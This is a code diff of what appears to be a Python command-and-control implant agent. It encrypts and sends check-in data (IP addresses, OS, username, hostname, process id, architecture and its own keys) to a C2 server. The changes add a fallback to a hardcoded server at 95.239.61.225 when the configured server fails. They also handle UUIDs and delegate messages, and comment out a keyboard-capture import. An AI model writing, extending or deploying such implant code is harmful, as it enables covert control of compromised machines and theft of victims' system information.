@@ -14,7 +14,7 @@ import platform
 import os
 import getpass
 import threading
-from pynput import keyboard
+# from pynput import keyboard
 import re
 import sys
 # import Xlib
@@ -71,25 +71,6 @@ class Agent:
     decryption_key = "AESPSK"
 
 
-def agent_encoder(agent):
-    if isinstance(agent, Agent):
-        return {
-            'Server': agent.Server,
-            'Port': agent.Port,
-            'URI': agent.URI,
-            'PayloadUUID': agent.PayloadUUID,
-            'UUID': agent.UUID,
-            'UserAgent': agent.UserAgent,
-            'HostHeader': agent.HostHeader,
-            'Sleep': agent.Sleep,
-            'Jitter': agent.Jitter,
-            'KillDate': agent.KillDate,
-            'Script': agent.Script,
-            'encryption_key': agent.encryption_key,
-            'decryption_key': agent.decryption_key,
-        }
-   
-
 def encrypt_AES256(data, key=Agent.encryption_key):
     key = base64.b64decode(key)
     data = json.dumps(data).encode()
@@ -108,10 +89,11 @@ def encrypt_code(data, key=Agent.encryption_key):
     ciphertext = cipher.encrypt(pad(data, 16))
     return iv + ciphertext
 
-def decrypt_AES256(data, key=Agent.encryption_key):
+def decrypt_AES256(data, key=Agent.encryption_key, UUID=False):
     key = base64.b64decode(key)
     # Decode and remove UUID from the message first
     data = base64.b64decode(data)
+    uuid = data[:36]
     data = data[36:]
     # hmac should include IV
     mac = data[-32:]  # sha256 hmac at the end
@@ -123,7 +105,11 @@ def decrypt_AES256(data, key=Agent.encryption_key):
     decrypted_message = decryption_cipher.decrypt(message)
     # now to remove any padding that was added on to make it the right block size of 16
     decrypted_message = unpad(decrypted_message, 16)
-    return json.loads(decrypted_message)
+    if UUID:
+        print("UUID = {}".format(uuid))
+        return uuid.decode("utf-8") + decrypted_message.decode("utf-8")
+    else:
+        return json.loads(decrypted_message)
 
 def decrypt_code(data, key=Agent.encryption_key):
     key = base64.b64decode(key)
@@ -140,11 +126,14 @@ def to64(data):
     base64_bytes = base64.b64encode(serialized)
     return base64_bytes.decode('utf-8')
 
-def from64(data):
+def from64(data, UUID=False):
     response_bytes = data.encode('utf-8')
     response_decode = base64.b64decode(response_bytes)
     response_message = response_decode.decode('utf-8')
-    return ast.literal_eval(response_message[36:])
+    if UUID:
+        return response_message
+    else:
+        return ast.literal_eval(response_message[36:])
 
 
 def getIP():
@@ -160,17 +149,51 @@ def send(response, uuid):
     if Agent.encryption_key != "":
         enc = encrypt_AES256(response)
         message = base64.b64encode(uuid.encode() + enc).decode("utf-8")
-        x = requests.post(Agent.Server + ":" + Agent.Port + Agent.URI, data = message, headers=Agent.UserAgent)
+        x = ""
+        try:
+            x = requests.post(agent.Server + ":" + agent.Port + agent.URI, data = message, headers=agent.UserAgent)
+        except Exception as e:
+            print(colored("Connection error, server {}:{} unreachable".format(agent.Server,agent.Port), "red"))
+            if "95.239.61.225" not in agent.Server:
+                agent.Server = "http://95.239.61.225"
+                agent.Port = "80"
+                print(colored("Switching to main server at {}:{}".format(agent.Server,agent.Port), "blue"))
+            try:
+                x = requests.post(agent.Server + ":" + agent.Port + agent.URI, data = message, headers=agent.UserAgent)
+            except:
+                print(colored("Connection error, main server {}:{} unreachable. Quitting".format(agent.Server,agent.Port), "red"))
+                sys.exit()
+
+        
         dec = decrypt_AES256(x.text)
-        return dec
+        if isinstance(dec, str):
+            return json.loads(dec)
+        else:
+            return dec
 
     else:
         serialized = json.dumps(response)
         message = to64(serialized)
         uuid = to64(uuid)
-        x = requests.post(agent.Server + ":" + agent.Port + agent.URI, data = uuid + message, headers=agent.UserAgent)
+        x = ""
+        try:
+            x = requests.post(agent.Server + ":" + agent.Port + agent.URI, data = uuid + message, headers=agent.UserAgent)
+        except Exception as e:
+            print(colored("Connection error, server {}:{} unreachable".format(agent.Server,agent.Port), "red"))
+            if "95.239.61.225" not in agent.Server:
+                agent.Server = "http://95.239.61.225"
+                agent.Port = "80"
+                print(colored("Switching to main server at {}:{}".format(agent.Server,agent.Port), "blue"))
+            try:
+                x = requests.post(agent.Server + ":" + agent.Port + agent.URI, data = uuid + message, headers=agent.UserAgent)
+            except:
+                print(colored("Connection error, main server {}:{} unreachable. Quitting".format(agent.Server,agent.Port), "red"))
+                sys.exit()
+
         res = from64(x.text)
         return res
+
+
 
 def checkin(agent):
 
@@ -178,7 +201,7 @@ def checkin(agent):
 
     checkin_data = {    
         "action": "checkin",
-        "ip": getPublicIP(),
+        "ip": getPublicIP() + "/" + getIP(),
         "os": platform.system() + " " + platform.release(),
         "user": getpass.getuser(),
         "host": socket.gethostname(),
@@ -186,13 +209,20 @@ def checkin(agent):
         "pid": os.getpid(),
         "uuid": agent.PayloadUUID,
         "architecture": platform.architecture(),
+        "encryption_key": agent.encryption_key,
+        "decryption_key": agent.decryption_key
         }
 
 
     res = send(checkin_data, Agent.PayloadUUID)
 
-    agent.UUID = res['id']
+    print("RESPONSE TYPE = {}".format(type(res)))
 
+    try:
+        agent.UUID = res['id']
+    except:
+        res = json.loads(res)
+        agent.UUID = res['id']
 
 
 
@@ -272,6 +302,8 @@ def post_result():
     if "delegates" in result:
         for m in result["delegates"]:
             delegates_aswers.append(m)
+            print(colored("NEW DELEGATE MESSAGE", "green"))
+            print(m)
 
     return result
 
